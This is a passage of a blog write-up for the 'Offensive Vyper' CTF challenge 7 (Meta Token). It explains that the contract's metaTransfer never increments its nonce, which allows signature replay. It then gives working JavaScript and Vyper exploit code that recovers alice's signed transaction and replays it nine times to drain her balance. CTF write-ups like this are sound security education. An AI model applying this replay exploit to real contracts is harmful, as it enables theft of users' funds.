+</span></span><span style="display:flex;"><span>    <span style="color:#000">receiver</span>: <span style="color:#000">address</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">v</span>: <span style="color:#000">uint256</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">r</span>: <span style="color:#000">uint256</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">s</span>: <span style="color:#000">uint256</span>
+</span></span><span style="display:flex;"><span>) -&gt; <span style="color:#000">bool</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Transfers `amount` on `sender`&#39;s behalf to `receiver`. Transfer is authenticated with an
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    offchain EC digital signature. Signature components `v`, `r`, and `s` can be generated using
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    client libraries are passed to `ecrecover` builtin. If `sender` does not match the recovered
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    signer, the signature is invalid. A nonce is added to protect against replay attacks.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param sender Address from which to transfer.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param receiver Address to which to transfer.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param amount Amount to transfer.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param v Recovery component of ECDSA.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param r ECDSA &#39;R&#39; coordinate.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param s ECDSA &#39;S&#39; coordinate.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">hash</span>: <span style="color:#000">bytes32</span> = <span style="color:#000">keccak256</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#000">concat</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">sender</span>, <span style="color:#000">bytes32</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">receiver</span>, <span style="color:#000">bytes32</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">amount</span>, <span style="color:#000">bytes32</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#000">convert</span>(<span style="color:#000">self</span>.<span style="color:#000">nonce</span>, <span style="color:#000">bytes32</span>)
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">message</span>: <span style="color:#000">bytes32</span> = <span style="color:#000">keccak256</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#000">concat</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#5a2">b</span><span style="color:#5a2">&#34;</span><span style="color:#5a2">\x19</span><span style="color:#5a2">Ethereum Signed Message:</span><span style="color:#5a2">\n</span><span style="color:#5a2">32&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#000">hash</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">signer</span>: <span style="color:#000">address</span> = <span style="color:#000">ecrecover</span>(<span style="color:#000">message</span>, <span style="color:#000">v</span>, <span style="color:#000">r</span>, <span style="color:#000">s</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">signer</span> == <span style="color:#000">sender</span>, <span style="color:#5a2">&#34;invalid sender&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">sender</span>] -= <span style="color:#000">amount</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">receiver</span>] = <span style="color:#000">unsafe_add</span>(<span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">receiver</span>], <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> <span style="color:#00f">True</span></span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>Contract main functions:</p>
+<ul>
+<li><code>transfer</code> decreases the <code>balanceOf</code> variable for <code>msg.sender</code> and increases it for <code>receiver</code> with the amount transferred</li>
+<li><code>approve</code> approves the <code>spender</code> to spend the <code>amount</code> on behalf of <code>msg.sender</code></li>
+<li><code>transferFrom</code>, similar to <code>transfer</code>, but it first checks if the sender is approved to transfer the amount</li>
+<li><code>metaTransfer</code> is the core function of this contract:
+<ul>
+<li>computes a <code>hash</code> by concatenating the <code>sender</code>, <code>receiver</code>, <code>amount</code> and <code>self.nonce</code> values (after they are converted to <code>bytes32</code>) - lines <code>92-99</code></li>
+<li>computes the <code>keccak256</code> hash of the string <code>b&quot;\x19Ethereum Signed Message:\n32&quot;</code> concatenated with the hash previously computed - lines <code>101-106</code></li>
+<li>calls <code>ecrecover</code> with <code>message</code>, <code>v</code>, <code>r</code> and <code>s</code> parameters to recover the <code>signer</code> of the message (line <code>108</code>)</li>
+<li>checks if the <code>signer</code> is equal to the <code>sender</code> parameter (line <code>109</code>)</li>
+<li>if the <code>signer</code> is equal to <code>sender</code>, it transfers the <code>amount</code> from <code>sender</code> to <code>receiver</code> (it updates the balances in <code>balanceOf</code>) - lines <code>111-112</code></li>
+</ul>
+</li>
+</ul>
+<p>Looking at the project setup, we can see that <code>alice</code> calls the <code>metaTransfer</code> to transfer <code>10</code> tokens to our attacker address (<a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/meta-token.challenge.js#L41-L48" target="_blank" rel="noopener noreffer ">setup</a>). It computes the values for <code>v</code>, <code>r</code> and <code>s</code> by calling the <code>splitSignature</code> (lines <code>37-39</code> - <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/meta-token.challenge.js#L37-L39" target="_blank" rel="noopener noreffer ">setup</a>) that in turn accepts a <code>messageHash</code> that is computed from the <code>alice</code> address, the <code>attacker</code> address, the <code>nonce</code> variable from the contract and the amount to transfer (i.e. <code>10</code>).</p>
+<p>Our goal is to drain all the tokens from <code>alice</code> account.</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">How is the signer verified?</div>
+        </div>
+    </div>
+<p>The signer is verified by calling <code>ecrecover</code> with the provided parameters (<code>v</code>, <code>r</code>, <code>s</code>) and the hash message.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>The <code>@dev</code> comment for the <code>metaTransfer</code> says:</p>
+<blockquote>
+<p>A nonce is added to protect against replay attacks.</p>
+</blockquote>
+<p>A <code>nonce</code> variable in the contract is read to compute the message, but it is never updated. It will always be <code>0</code>, so a replay attack is possible.</p>
+</div>
+        </div>
+    </div>
+<p>If we know the values of <code>v</code>, <code>r</code>, and <code>s</code>, we can reuse them and perform the same transfer. The other information used to build the message is <code>sender</code> (<code>alice</code> address), <code>receiver</code> (<code>attacker</code> address), <code>amount</code> (<code>10</code>) and <code>self.nonce</code> (<code>0</code>).</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">How can we recover function parameters?</div>
+        </div>
+    </div>
+<p>The parameters passed to <code>metaTransfer</code> (and thus to <code>ecrecover</code>) are part of the transaction data, so it&rsquo;s possible to retrieve them.
+The <code>nonce</code> is never updated, so we can reply to the same message sent by <code>alice</code> and thus update the balance of our attacker. Since <code>alice</code> has <code>100</code> tokens and <code>10</code> are already sent to our attacker address during the challenge setup, if we call (i.e. reply) the <code>metaTransfer</code> function <code>9</code> times with the same data, we will be able to drain all the <code>alice</code> tokens (each transaction will increase the <code>balances</code> of our attacker by <code>10</code> tokens).</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>The solution consists of the following steps:</p>
+<ul>
+<li>traverse the latest blocks until we find the block containing the transaction done by <code>alice</code> where the <code>metaTransfer</code> function is called</li>
+<li>extract the parameters passed to <code>metaTransfer</code> that are <code>sender</code>, <code>receiver</code>, <code>amount</code>, <code>v</code>, <code>r</code>, and <code>s</code></li>
+<li>pass these values to our exploit contract that will call <code>metaTransfer</code> for <code>9</code> times</li>
+</ul>
+<p><code>meta-token.challenge.js</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// YOUR EXPLOIT HERE
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">exploit</span> = <span style="color:#00f">await</span> (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;MetaTokenExploit&#39;</span>, <span style="color:#000">deployer</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">iface</span> = <span style="color:#00f">new</span> <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">Interface</span>([<span style="color:#5a2">&#39;function metaTransfer(address sender, address receiver, uint256 amount, uint256 v, uint256 r, uint256 s)&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">provider</span> = <span style="color:#000">attacker</span>.<span style="color:#000">provider</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">done</span> = <span style="color:#00f">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// iterate over latest blocks
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">for</span>(<span style="color:#00f">let</span> <span style="color:#000">blockNumber</span> = <span style="color:#3af">0</span>; <span style="color:#000">blockNumber</span> &lt; (<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBlockNumber</span>()); <span style="color:#000">blockNumber</span>++) {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>            <span style="color:#888;font-style:italic">// get transactions hash
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>            <span style="color:#00f">let</span> <span style="color:#000">transactions</span> = (<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBlock</span>(<span style="color:#000">blockNumber</span>)).<span style="color:#000">transactions</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">for</span>(<span style="color:#00f">const</span> <span style="color:#000">txHash</span> <span style="color:#00f">of</span> <span style="color:#000">transactions</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#00f">try</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#888;font-style:italic">// get the tx data ...
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>                    <span style="color:#00f">let</span> <span style="color:#000">txData</span> = (<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getTransaction</span>(<span style="color:#000">txHash</span>)).<span style="color:#000">data</span>
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#888;font-style:italic">// ... and try to decode it
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>                    <span style="color:#00f">let</span> {<span style="color:#000">sender</span>, <span style="color:#000">receiver</span>, <span style="color:#000">amount</span>, <span style="color:#000">v</span>, <span style="color:#000">r</span>, <span style="color:#000">s</span>} = <span style="color:#000">iface</span>.<span style="color:#000">decodeFunctionData</span>(<span style="color:#5a2">&#39;metaTransfer&#39;</span>, <span style="color:#000">txData</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#000">expect</span>(<span style="color:#000">sender</span>).<span style="color:#000">to</span>.<span style="color:#000">be</span>.<span style="color:#000">equal</span>(<span style="color:#000">alice</span>.<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#000">expect</span>(<span style="color:#000">receiver</span>).<span style="color:#000">to</span>.<span style="color:#000">be</span>.<span style="color:#000">equal</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>                    <span style="color:#00f">await</span> <span style="color:#000">exploit</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>(<span style="color:#000">sender</span>, <span style="color:#000">attacker</span>.<span style="color:#000">address</span>, <span style="color:#000">amount</span>, <span style="color:#000">v</span>, <span style="color:#000">r</span>, <span style="color:#000">s</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#000">done</span> = <span style="color:#00f">true</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                } <span style="color:#00f">catch</span> {}
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">if</span>(<span style="color:#000">done</span>) <span style="color:#00f">break</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p><code>MetaTokenExploit.vy</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># YOUR EXPLOIT HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">run</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#000">sender</span>: <span style="color:#000">address</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">receiver</span>: <span style="color:#000">address</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">v</span>: <span style="color:#000">uint256</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">r</span>: <span style="color:#000">uint256</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#000">s</span>: <span style="color:#000">uint256</span>
+</span></span><span style="display:flex;"><span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">for</span> <span style="color:#000">i</span> <span style="color:#00f">in</span> <span style="color:#000">range</span>(<span style="color:#3af">9</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#000">Token</span>(<span style="color:#000">self</span>.<span style="color:#000">target</span>).<span style="color:#000">metaTransfer</span>(<span style="color:#000">sender</span>, <span style="color:#000">receiver</span>, <span style="color:#000">amount</span>, <span style="color:#000">v</span>, <span style="color:#000">r</span>, <span style="color:#000">s</span>)</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>You can find the complete code <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/test/meta-token.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/offensive_vyper-solutions/blob/main/contracts/exploits/MetaTokenExploit.vy" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="4-references">4) References</h2>
+<ul>
+<li><a href="https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html" target="_blank" rel="noopener noreffer ">Solidity - ecrecover</a></li>
+<li><a href="https://swcregistry.io/docs/SWC-117" target="_blank" rel="noopener noreffer ">SWC-117 - Signature Malleability</a></li>
+<li><a href="https://swcregistry.io/docs/SWC-121" target="_blank" rel="noopener noreffer ">SWC-121 - Missing Protection against Signature Replay Attacks</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on October 8, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/offensivevyper_07_metatoken/" data-title="Offensive Vyper - Challenge 7 - Meta Token" data-via="_d3lla_" data-hashtags="Offensive Vyper,CTF,Vyper,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/offensivevyper_07_metatoken/" data-hashtag="Offensive Vyper"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/offensivevyper_07_metatoken/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/offensive-vyper/">Offensive Vyper</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/vyper/">Vyper</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/offensivevyper_06_ownableproxy/" class="prev" rel="prev" title="Offensive Vyper - Challenge 6 - Ownable Proxy"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Offensive Vyper - Challenge 6 - Ownable Proxy</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
